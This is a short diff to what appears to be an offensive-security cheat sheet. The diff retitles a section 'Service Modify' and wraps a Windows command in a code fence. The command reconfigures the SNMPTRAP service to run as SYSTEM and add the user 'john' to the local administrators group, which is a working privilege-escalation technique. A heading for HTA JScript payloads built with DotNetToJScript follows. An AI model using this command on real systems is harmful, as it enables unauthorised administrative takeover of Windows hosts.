@@ -1,7 +1,8 @@
-Service CheatSheet
+Service Modify
 ---------------------
+```powershell
 sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""
-
+```
 HTA JS PAYLOAD
 ---------------------
 DotNetToJScript
